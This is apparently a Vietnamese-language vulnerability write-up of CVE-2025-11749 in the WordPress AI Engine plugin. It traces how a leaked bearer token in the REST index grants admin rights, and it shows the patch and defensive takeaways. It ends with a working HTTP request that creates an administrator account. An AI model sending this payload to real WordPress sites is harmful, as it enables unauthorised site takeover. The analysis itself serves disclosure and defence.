# CVE-2025-11749 Analysis & POC


<!--more-->

## CVE & Basic Info
Plugin AI Engine cho WordPress bá»‹ lá»— há»•ng **lá»™ thÃ´ng tin nháº¡y cáº£m** trong táº¥t cáº£ cÃ¡c phiÃªn báº£n tá»« trÆ°á»›c Ä‘áº¿n **3.1.3**, thÃ´ng qua endpoint REST API **/mcp/v1/**. Lá»— há»•ng nÃ y lÃ m lá»™ **Bearer Token** khi tÃ¹y chá»n **â€œNo-Auth URLâ€** Ä‘Æ°á»£c báº­t. Äiá»u nÃ y cho phÃ©p káº» táº¥n cÃ´ng **khÃ´ng cáº§n xÃ¡c thá»±c** láº¥y Ä‘Æ°á»£c bearer token, tá»« Ä‘Ã³ cÃ³ thá»ƒ truy cáº­p vÃ o má»™t phiÃªn lÃ m viá»‡c há»£p lá»‡ vÃ  thá»±c hiá»‡n nhiá»u hÃ nh Ä‘á»™ng nhÆ° **táº¡o tÃ i khoáº£n quáº£n trá»‹ viÃªn má»›i**, dáº«n Ä‘áº¿n **leo thang Ä‘áº·c quyá»n**.

* **CVE ID**: [CVE-2025-11749](https://www.cve.org/CVERecord?id=CVE-2025-11749)
* **Vulnerability Type**: Privilege Escalation
* **Affected Versions**: <= 3.1.3
* **Patched Versions**: 3.1.4
* **CVSS severity**: High (9.8)
* **Required Privilege**: Unauthenticated
* **Product**: [WordPress AI Engine Plugin](https://wordpress.org/plugins/ai-engine/)

## Requirements
* **Local WordPress & Debugging**
    * [Virtual Machine](https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/)
    * [Docker](https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/)
* **Plugin Version** - **AI Engine**:  
    * `3.1.3` â€“ **vulnerable**  
    * `3.1.4` â€“ **patched**
* **Diff Tool (diff)** â†’ [**Meld**](https://meldmerge.org/) hoáº·c báº¥t ká»³ cÃ´ng cá»¥ diff nÃ o.

## Analysis 
Plugin Ä‘Ã£ Ä‘Äƒng kÃ½ API:

```php {title="mcp.php v3.1.3" data-open=true hl_lines=[9,13]}
public function rest_api_init() {
    // Load bearer token if not already loaded
    if ( $this->bearer_token === null ) {
      $this->bearer_token = $this->core->get_option( 'mcp_bearer_token' );
    }
    ...
    // No-Auth URL endpoints (with token in path)
    $noauth_enabled = $this->core->get_option( 'mcp_noauth_url' );
    if ( $noauth_enabled && !empty( $this->bearer_token ) ) {
        ...
        register_rest_route( $this->namespace, '/' . $this->bearer_token . '/messages', [
            'methods' => 'POST',
            'callback' => [ $this, 'handle_message' ],
            'permission_callback' => function ( $request ) {
                return $this->handle_noauth_access( $request );
            },
        ] );
    }
}
```

Äiá»u kiá»‡n Ä‘á»ƒ cÃ¡c API nÃ y hoáº¡t Ä‘á»™ng lÃ :
* **Bearer Token** pháº£i Ä‘Æ°á»£c thiáº¿t láº­p (Ä‘Ã£ tá»“n táº¡i giÃ¡ trá»‹).
* TÃ¹y chá»n **No-Auth URL** pháº£i Ä‘Æ°á»£c báº­t.

Ta cÃ³ thá»ƒ hoÃ n thÃ nh cÃ¡c thiáº¿t láº­p nÃ y trong Admin Dashboard (Endpoint: `/wp-admin/admin.php?page=mwai_settings&nekoTab=settings`) theo thá»© tá»± nhÆ° sau:

![Enable](enable.png "Setup Bearer Token vÃ  No-Auth URL")

Ta Ä‘áº·t **Bearer Token** thÃ nh 1 chuá»—i báº¥t kÃ¬, vÃ­ dá»¥: `aaaaaaaaaa`

Chuá»—i nÃ y Ä‘Ã³ng vai trÃ² nhÆ° **chÃ¬a khÃ³a bÃ­ máº­t Ä‘á»ƒ** truy cáº­p cÃ¡c API nÃ y.
Chá»‰ nhá»¯ng ai biáº¿t giÃ¡ trá»‹ nÃ y má»›i cÃ³ thá»ƒ gá»i Ä‘Æ°á»£c cÃ¡c endpoint tÆ°Æ¡ng á»©ng.

Tuy nhiÃªn, theo mÃ´ táº£ cá»§a CVE thÃ¬ Ä‘Ã¢y lÃ  1 pháº§n cá»§a lá»— há»•ng, ngay cáº£ ngÆ°á»i dÃ¹ng chÆ°a Ä‘Äƒng nháº­p cÅ©ng cÃ³ biáº¿t giÃ¡ trá»‹ cá»§a **Bearer Token** => khÃ´ng cÃ²n lÃ  **bÃ­ máº­t** ná»¯a.

Má»i thá»© Ä‘Æ°á»£c **báº­t mÃ­** khi ta truy cáº­p `/wp-json`, WordPress sáº½ tráº£ vá» **REST API Index** â€” tá»©c lÃ  báº£n mÃ´ táº£ toÃ n bá»™ cÃ¡c API mÃ  website Ä‘ang cung cáº¥p, bao gá»“m cÃ¡c API chá»©a **Bearer Token**.

![Exposed](exposed.png "GiÃ¡ trá»‹ Bearer Token trong response")

Táº¥t cáº£ ngÆ°á»i dÃ¹ng (ká»ƒ cáº£ **chÆ°a Ä‘Äƒng nháº­p**) Ä‘á»u cÃ³ thá»ƒ gá»i Ä‘áº¿n `/wp-json` nÃ y.

Báº£n vÃ¡ **v3.1.4** thÃªm tÃ¹y chá»n `'show_in_rest' => false` khi Ä‘Äƒng kÃ½ API, nháº±m **áº©n cÃ¡c endpoint khá»i `/wp-json`**.

![Patch](patch.png "Báº£n vÃ¡")

Äiá»u nÃ y giÃºp:

* KhÃ´ng hiá»ƒn thá»‹ API trong danh sÃ¡ch REST
* Giáº£m kháº£ nÄƒng bá»‹ dÃ² quÃ©t

Tuy nhiÃªn:

* API váº«n truy cáº­p Ä‘Æ°á»£c náº¿u biáº¿t URL
* KhÃ´ng thay tháº¿ cho cÆ¡ cháº¿ xÃ¡c thá»±c an toÃ n

ğŸ‘‰ ÄÃ¢y chá»‰ lÃ  biá»‡n phÃ¡p che giáº¥u, khÃ´ng pháº£i báº£o máº­t thá»±c sá»±.

API Ä‘Ã£ Ä‘Æ°á»£c Ä‘Äƒng kÃ½ vá»›i `permission_callback` lÃ  `handle_noauth_access`:

```php {title="permission_callback" data-open=true hl_lines=[5,14]}
public function handle_noauth_access( $request ) {
    // For no-auth URLs, the token is already verified by being in the URL path
    // Double-check that the route actually contains the token
    $route = $request->get_route();
    if ( strpos( $route, '/' . $this->bearer_token . '/' ) === false ) {
      if ( $this->logging ) {
        error_log( '[AI Engine MCP] âŒ Invalid no-auth URL access attempt.' );
      }
      return false;
    }

    // Set the current user to admin since token is valid
    if ( $admin = $this->core->get_admin_user() ) {
      wp_set_current_user( $admin->ID, $admin->user_login );
    }
    return true;
}
```

HÃ m thá»±c hiá»‡n kiá»ƒm tra **Bearer Token** cÃ³ há»£p lá»‡ hay khÃ´ng. Náº¿u há»£p lá»‡, hÃ m sáº½:

```php
wp_set_current_user( $admin->ID, $admin->user_login );
```

GÃ¡n ngÆ°á»i dÃ¹ng hiá»‡n táº¡i thÃ nh admin, cho phÃ©p `"request hiá»‡n táº¡i"` tiáº¿p tá»¥c thá»±c thi vá»›i toÃ n quyá»n quáº£n trá»‹. Sau khi request káº¿t thÃºc thÃ¬ quyá»n admin cÅ©ng háº¿t.

Khi ta truy cáº­p endpoint `/wp-json/mcp/v1/aaaaaaaaaa/messages` thÃ¬ callback `handle_message` sáº½ Ä‘Æ°á»£c gá»i:

```php {title="mcp.php v3.1.3" data-open=true hl_lines=[10,21,32]}
public function handle_message( WP_REST_Request $request ) {
    ...
    $raw = $request->get_body();
    $dat = json_decode( $raw, true );
    ...
    $id = $dat['id'] ?? null;
    $method = $dat['method'] ?? null;
    ...
    // It's a notification, no ID = no reply
    if ( $id === null && $method !== null ) {
      return new WP_REST_Response( null, 204 );
    }
    ...
    try {

      $reply = null;

      #region Methods switch
      switch ( $method ) {
        ...
        case 'tools/call':
          $params = $dat['params'] ?? [];
          $tool = $params['name'] ?? '';
          $arguments = $params['arguments'] ?? [];

          if ( $this->logging ) {
            error_log( '[AI Engine MCP SSE] ğŸ”§ tools/call - Tool: ' . $tool );
            error_log( '[AI Engine MCP SSE] ğŸ”§ tools/call - Arguments: ' . wp_json_encode( $arguments ) );
          }

          try {
            $reply = $this->execute_tool( $tool, $arguments, $id );
            if ( $this->logging ) {
              error_log( '[AI Engine MCP SSE] âœ… tools/call - Success for tool: ' . $tool );
            }
          }
          catch ( Exception $e ) {
            if ( $this->logging ) {
              error_log( '[AI Engine MCP SSE] âŒ tools/call - Error: ' . $e->getMessage() );
            }
            throw $e;
          }
          break;
        ...
      }
      #endregion

      if ( $reply ) {
        // Don't log response queuing - it's too noisy
        $this->store_message( $sess, $reply );
      }

    }
    catch ( Exception $e ) {
      $this->queue_error( $sess, $id, -32603, 'Internal error', $e->getMessage() );
    }

    return new WP_REST_Response( null, 204 );
}
```

HÃ m nháº­n má»™t request JSON, phÃ¢n tÃ­ch ná»™i dung, thá»±c thi hÃ nh Ä‘á»™ng tÆ°Æ¡ng á»©ng vÃ  tráº£ káº¿t quáº£ (náº¿u cáº§n).
* Náº¿u lÃ  notification (khÃ´ng cÃ³ `id`) â†’ KhÃ´ng cáº§n pháº£n há»“i â†’ tráº£ HTTP 204
```php
if ($id === null && $method !== null)
```
* Xá»­ lÃ½ theo method: Náº¿u lÃ  `tools/call` thÃ¬ láº¥y cÃ¡c param cáº§n thiáº¿t vÃ  gá»i Ä‘áº¿n `execute_tool( $tool, $arguments, $id );` Ä‘á»ƒ thá»±c thi tool ná»™i bá»™.

Request body hiá»‡n táº¡i sáº½ nhÆ° sau:

```json
{
  "id": 1,
  "method": "tools/call",
  "params": {
  },
  "name": "2",
  "arguments": "3"
}
```

```php {title="mcp.php v3.1.3" data-open=true hl_lines=[4]}
private function execute_tool( $tool, $args, $id ) {
    try {
      ...
      $filtered = apply_filters( 'mwai_mcp_callback', null, $tool, $args, $id, $this );
      ...
    }
    catch ( Exception $e ) {
      return $this->rpc_error( $id, -32603, $e->getMessage() );
    }
}
```

HÃ m `execute_tool` gá»i Ä‘áº¿n cÃ¡c callback Ä‘Ã£ Ä‘Äƒng kÃ½ cho filter `mwai_mcp_callback` cÃ¹ng 3 tham sá»‘ Ä‘Ã£ truyá»n vÃ o trÆ°á»›c Ä‘Ã³.

Khi search vá»›i tá»« khÃ³a `mwai_mcp_callback` ta tháº¥y nÃ³ Ä‘Æ°á»£c Ä‘Äƒng kÃ½ trong class `Meow_MWAI_Labs_MCP_Core`, nÆ¡i áº£nh hÆ°á»Ÿng trá»±c tiáº¿p Ä‘áº¿n lá»— há»•ng nÃ y.

![Filter](filter.png "Filter mwai_mcp_callback")

Äiá»u kiá»‡n Ä‘á»ƒ filter nÃ y hoáº¡t Ä‘á»™ng lÃ  class `Meow_MWAI_Labs_MCP_Core` pháº£i Ä‘Æ°á»£c khá»Ÿi táº¡o á»Ÿ Ä‘Ã¢u Ä‘Ã³.

![Init](init.png "Meow_MWAI_Labs_MCP_Core Ä‘Æ°á»£c khá»Ÿi táº¡o")

Äiá»u nÃ y chá»‰ xáº£y ra khi MCP Features WordPress Ä‘Æ°á»£c báº­t. Ta cÃ³ thá»ƒ hoÃ n thÃ nh cÃ¡c thiáº¿t láº­p nÃ y trong Admin Dashboard (Endpoint: `/wp-admin/admin.php?page=mwai_settings&nekoTab=settings`)

![Enable1](enable1.png "Báº­t MCP Features WordPress")

Khi filter Ä‘Æ°á»£c Ã¡p dá»¥ng, callback `handle_call` sáº½ Ä‘Æ°á»£c gá»i:

```php {title="mcp-core.php v3.1.3" data-open=true hl_lines=[7]}
public function handle_call( $prev, string $tool, array $args, int $id ) {
    // Security check is already done in the MCP auth layer
    // If we reach here, the user is authorized to use MCP
    if ( !empty( $prev ) || !isset( $this->tools()[ $tool ] ) ) {
      return $prev;
    }
    return $this->dispatch( $tool, $args, $id );
}
```

Náº¿u lÃ  tool há»£p lá»‡ => gá»i Ä‘áº¿n `dispatch( $tool, $args, $id )`

Trong danh sÃ¡ch tool há»£p lá»‡, gá»“m cÃ³ tool `wp_create_user` dÃ¹ng Ä‘á»ƒ táº¡o user má»›i => Táº¡o Ä‘Æ°á»£c ngÆ°á»i dÃ¹ng vá»›i quyá»n `administrator`

![Tool](valid_tool.png "Tool wp_create_user")

Tool nÃ y yÃªu cáº§u cÃ¡c thuá»™c tÃ­nh: `user_login`, `user_email`, `user_pass`, `display_name`, `role`. 

Request body hiá»‡n táº¡i sáº½ nhÆ° sau:

```json
{
  "id": 1,
  "method": "tools/call",
  "params": {
    "name": "wp_create_user",
    "arguments": {
      "user_login": "hacker",
      "user_email": "hacker@gmail.com",
      "user_pass": "hacker",
      "display_name": "hacker",
      "role": "administrator"
    }
  },
  "name": "2",
  "arguments": "3"
}
```

Tiáº¿p tá»¥c phÃ¢n tÃ­ch hÃ m `dispatch`:

```php {title="mcp-core.php v3.1.3" data-open=true hl_lines=[13]}
private function dispatch( string $tool, array $a, int $id ): array {
    $r = [ 'jsonrpc' => '2.0', 'id' => $id ];
    switch ( $tool ) {
    ...
      case 'wp_create_user':
        $data = [
          'user_login' => sanitize_user( $a['user_login'] ),
          'user_email' => sanitize_email( $a['user_email'] ),
          'user_pass' => $a['user_pass'] ?? wp_generate_password( 12, true ),
          'display_name' => sanitize_text_field( $a['display_name'] ?? '' ),
          'role' => sanitize_key( $a['role'] ?? get_option( 'default_role', 'subscriber' ) ),
        ];
        $uid = wp_insert_user( $data );
        if ( is_wp_error( $uid ) ) {
          $r['error'] = [ 'code' => $uid->get_error_code(), 'message' => $uid->get_error_message() ];
        }
        else {
          $this->add_result_text( $r, 'User created ID ' . $uid );
        }
        break;
    ...
    }
}
```

HÃ m gá»i Ä‘áº¿n `wp_insert_user` Ä‘á»ƒ táº¡o tÃ i khoáº£n WordPress má»›i vá»›i táº¥t cáº£ cÃ¡c giÃ¡ trá»‹ do ta kiá»ƒm soÃ¡t => **Privilege Escalation** xáº£y ra

## Flow
{{< mermaid >}}
flowchart TD
A["Unauthenticated Attacker"]
--> B["Access /wp-json"]

B --> C["REST API exposes MCP endpoints (Bearer Token leaked)"]

C --> D["Extract Bearer Token from response"]

D --> E["Send POST request to /wp-json/mcp/v1/{token}/messages"]

E --> F["permission_callback â†’ handle_noauth_access()"]

F --> G["Bearer Token valid"]

G --> H["wp_set_current_user(admin)"]

H --> I["handle_message()"]

I --> J["method = tools/call"]

J --> K["execute_tool()"]

K --> L["mwai_mcp_callback triggered"]

L --> M["dispatch()"]

M --> N["wp_create_user()"]

N --> O["New administrator account created"]

O --> P["Privilege Escalation"]
{{< /mermaid >}}

## Proof of Concept (PoC)
1. Truy cáº­p endpoint `/wp-json` Ä‘á»ƒ láº¥y giÃ¡ trá»‹ **Bearer Token**
2. Gá»­i request:

```http
POST /wp-json/mcp/v1/{token}/messages HTTP/1.1
Host: localhost

{
  "id": 1,
  "method": "tools/call",
  "params": {
    "name": "wp_create_user",
    "arguments": {
      "user_login": "hacker",
      "user_email": "hacker@gmail.com",
      "user_pass": "hacker",
      "display_name": "hacker",
      "role": "administrator"
    }
  },
  "name": "2",
  "arguments": "3"
}
```
3. Login vá»›i tÃ i khoáº£n vá»«a táº¡o

![Result](result.png "Káº¿t quáº£")

## Conclusion

Lá»— há»•ng trong AI Engine (â‰¤ 3.1.3) xuáº¥t phÃ¡t tá»« viá»‡c **káº¿t há»£p sai giá»¯a cÆ¡ cháº¿ â€œNo-Auth URLâ€ vÃ  logic phÃ¢n quyá»n ná»™i bá»™**, dáº«n Ä‘áº¿n viá»‡c **cáº¥p quyá»n quáº£n trá»‹ chá»‰ dá»±a trÃªn má»™t Bearer Token bá»‹ lá»™ cÃ´ng khai**.
Khi endpoint MCP Ä‘Æ°á»£c hiá»ƒn thá»‹ trong `/wp-json`, káº» táº¥n cÃ´ng cÃ³ thá»ƒ thu tháº­p token, gá»i trá»±c tiáº¿p API vÃ  thá»±c thi cÃ¡c hÃ nh Ä‘á»™ng nháº¡y cáº£m nhÆ° táº¡o tÃ i khoáº£n quáº£n trá»‹ má»›i mÃ  **khÃ´ng cáº§n xÃ¡c thá»±c**.

Máº·c dÃ¹ quyá»n admin chá»‰ tá»“n táº¡i trong vÃ²ng Ä‘á»i cá»§a request, nhÆ°ng chá»‰ cáº§n **má»™t láº§n gá»i há»£p lá»‡** lÃ  Ä‘á»§ Ä‘á»ƒ táº¡o tÃ i khoáº£n quáº£n trá»‹ vÄ©nh viá»…n, dáº«n Ä‘áº¿n **Privilege Escalation hoÃ n chá»‰nh**.

Báº£n vÃ¡ v3.1.4 chá»‰ áº©n endpoint khá»i REST index, giÃºp giáº£m kháº£ nÄƒng bá»‹ dÃ² quÃ©t, nhÆ°ng **khÃ´ng giáº£i quyáº¿t triá»‡t Ä‘á»ƒ váº¥n Ä‘á» thiáº¿t káº¿ báº£o máº­t cá»‘t lÃµi**.

## Key Takeaways

* **KhÃ´ng bao giá» sá»­ dá»¥ng token trong URL nhÆ° cÆ¡ cháº¿ xÃ¡c thá»±c.**
* **áº¨n endpoint (`show_in_rest = false`) khÃ´ng Ä‘á»“ng nghÄ©a vá»›i báº£o máº­t.**
* **`wp_set_current_user()` khÃ´ng nÃªn Ä‘Æ°á»£c dÃ¹ng cho xÃ¡c thá»±c tá»« request bÃªn ngoÃ i.**
* **Má»i API cÃ³ kháº£ nÄƒng thay Ä‘á»•i tráº¡ng thÃ¡i há»‡ thá»‘ng pháº£i cÃ³ xÃ¡c thá»±c máº¡nh (auth + authorization).**
* **Viá»‡c gÃ¡n quyá»n admin trong request, dÃ¹ táº¡m thá»i, váº«n Ä‘á»§ Ä‘á»ƒ gÃ¢y leo thang Ä‘áº·c quyá»n.**
* **REST API cáº§n Ä‘Æ°á»£c thiáº¿t káº¿ theo nguyÃªn táº¯c â€œdeny by defaultâ€.**

## References
[Privilege Escalation](https://patchstack.com/academy/wordpress/vulnerabilities/privilege-escalation/)

[WordPress AI Engine Plugin <= 3.1.3 is vulnerable to a high priority Privilege Escalation](https://patchstack.com/database/wordpress/plugin/ai-engine/vulnerability/wordpress-ai-engine-plugin-3-1-3-unauthenticated-sensitive-information-exposure-to-privilege-escalation-vulnerability) 

---

> TÃ¡c giáº£: [Bui Van Y](github.com/w41bu1)  
> URL: http://localhost:1313/vi/posts/2026-01-01-cve-2025-11749/  

